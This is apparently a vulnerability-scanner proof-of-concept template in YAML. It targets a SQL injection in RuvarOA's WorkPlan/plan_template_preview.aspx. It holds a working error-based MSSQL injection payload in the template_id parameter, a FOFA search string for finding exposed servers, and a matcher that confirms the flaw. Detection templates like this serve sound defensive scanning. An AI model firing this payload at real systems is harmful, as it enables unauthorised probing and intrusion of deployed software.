id: poc-yaml-ruvaroa-plan-template-preview-sqli
info:
  name: RuvarOA plan_template_preview SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: ruvar-oa
  fofa: body="txt_admin_key"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: GET
  path: /WorkPlan/plan_template_preview.aspx?template_id=%28-1)+and+1=sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))--+%29
  expression: 'status_code == 500 &&

    contains(body,"[Exception]:") &&

    contains(body,"0x" + t2) &&

    contains(body,"转换成数据类型 int 时失败")

    '
transport: http
